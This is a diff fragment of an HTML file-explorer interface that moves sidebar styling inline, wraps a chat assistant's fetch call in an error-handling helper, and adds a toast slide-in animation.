-                                <div class="sidebar-item active" onclick="sendCommand('ls', ['.'])">
-                                    <span class="sidebar-icon"><i class="fas fa-star" style="color: #f1c40f;"></i></span> Favorites
+                                <div class="sidebar-header" style="padding: 4px 16px; font-weight: 600; color: #888; text-transform: uppercase; font-size: 11px;">Quick Access</div>
+                                <div class="sidebar-item" style="padding: 6px 20px; cursor: pointer; display: flex; align-items: center; gap: 8px; color: #ccc;" onclick="sendCommand('ls', ['.'])">
+                                    <i class="fas fa-star" style="color: #f1c40f; width: 16px; text-align: center;"></i> Favorites
                                 </div>
-                                <div class="sidebar-item" onclick="sendCommand('ls', ['Desktop'])">
-                                    <span class="sidebar-icon"><i class="fas fa-desktop" style="color: #3498db;"></i></span> Desktop
+                                <div class="sidebar-item" style="padding: 6px 20px; cursor: pointer; display: flex; align-items: center; gap: 8px; color: #ccc;" onclick="sendCommand('ls', ['Desktop'])">
+                                    <i class="fas fa-desktop" style="color: #3498db; width: 16px; text-align: center;"></i> Desktop
                                 </div>
-                                <div class="sidebar-item" onclick="sendCommand('ls', ['Downloads'])">
-                                    <span class="sidebar-icon"><i class="fas fa-download" style="color: #2ecc71;"></i></span> Downloads
+                                <div class="sidebar-item" style="padding: 6px 20px; cursor: pointer; display: flex; align-items: center; gap: 8px; color: #ccc;" onclick="sendCommand('ls', ['Downloads'])">
+                                    <i class="fas fa-download" style="color: #2ecc71; width: 16px; text-align: center;"></i> Downloads
                                 </div>
-                                <div class="sidebar-item" onclick="sendCommand('ls', ['Documents'])">
-                                    <span class="sidebar-icon"><i class="fas fa-file-alt" style="color: #e67e22;"></i></span> Documents
+                                <div class="sidebar-item" style="padding: 6px 20px; cursor: pointer; display: flex; align-items: center; gap: 8px; color: #ccc;" onclick="sendCommand('ls', ['Documents'])">
+                                    <i class="fas fa-file-alt" style="color: #e67e22; width: 16px; text-align: center;"></i> Documents
                                 </div>
                             </div>
-                            <div class="sidebar-group">
-                                <div class="sidebar-header">This PC</div>
-                                <div class="sidebar-item" onclick="sendCommand('ls', ['C:/'])">
-                                    <span class="sidebar-icon"><i class="fas fa-hdd" style="color: #95a5a6;"></i></span> Local Disk (C:)
+                            <div class="sidebar-group" style="margin-top: 15px;">
+                                <div class="sidebar-header" style="padding: 4px 16px; font-weight: 600; color: #888; text-transform: uppercase; font-size: 11px;">This PC</div>
+                                <div class="sidebar-item" style="padding: 6px 20px; cursor: pointer; display: flex; align-items: center; gap: 8px; color: #ccc;" onclick="sendCommand('ls', ['C:/'])">
+                                    <i class="fas fa-hdd" style="color: #bdc3c7; width: 16px; text-align: center;"></i> Local Disk (C:)
                                 </div>
                             </div>
                         </div>
 
                         <!-- File List -->
-                        <div class="file-list-container">
+                        <div class="file-list-container" style="flex: 1; overflow-y: auto; position: relative;">
                             <table class="file-table" id="fileTable">
                                 <thead>
                                     <tr>
@@ -3085,13 +4041,13 @@
                 // Simulate AI response (or fetch)
                 try {
                     // Try to hit backend
-                    const response = await fetch('/api/copilot', {
+                    const response = await fetchWithError('/api/copilot', {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({ message: msg })
                     });
 
-                    if (response.ok) {
+                    if (response) {
                         const data = await response.json();
                         addMessage('bot', data.response || data.answer || "I'm listening.");
                     } else {
@@ -3322,6 +4278,19 @@
         animate();
     </script>
 
+    <style>
+        @keyframes toastSlide {
+            from {
+                transform: translateX(100px);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+    </style>
 </body>
 
 </html>
